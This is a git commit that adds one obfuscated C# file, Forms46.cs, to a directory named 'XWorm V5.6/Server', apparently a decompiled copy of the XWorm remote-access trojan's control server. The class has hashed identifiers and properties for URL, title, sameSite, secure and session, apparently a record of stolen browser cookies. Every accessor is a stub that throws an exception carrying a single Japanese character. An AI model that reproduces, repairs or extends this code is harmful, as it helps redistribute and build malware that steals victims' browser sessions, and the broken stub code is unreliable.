b7d5ba29c405e7b2a195eeeeae285130367d8b83
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:11 +0400

    Forms46.cs

---
+++ XWorm V5.6/Server/Forms/Forms46.cs
@@ -0,0 +1,49 @@
+﻿using IF7ECB736801D875D48E6C65CE1BIEF6;
+using System;
+using System.Runtime.CompilerServices;
+
+namespace M3D2EFMCBF161EM7051AD11C09FM858F
+{
+  public class M1C7084379882725E50A3B90D77B29D9 : I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int L05290L66BBDE3B8A52CAACL21CF630B;
+    public static int E6E8E79582E3A2AA801B2276D464C092;
+
+    public string sUrl
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("り");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぐ");
+    }
+
+    public string sTitle
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("く");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("じ");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sameSite(string AutoPropertyValue) => throw new Exception("や");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public bool get_secure() => throw new Exception("ふ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_secure(bool AutoPropertyValue) => throw new Exception("け");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public bool get_session() => throw new Exception("ぉ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_session(bool AutoPropertyValue) => throw new Exception("び");
+  }
+}
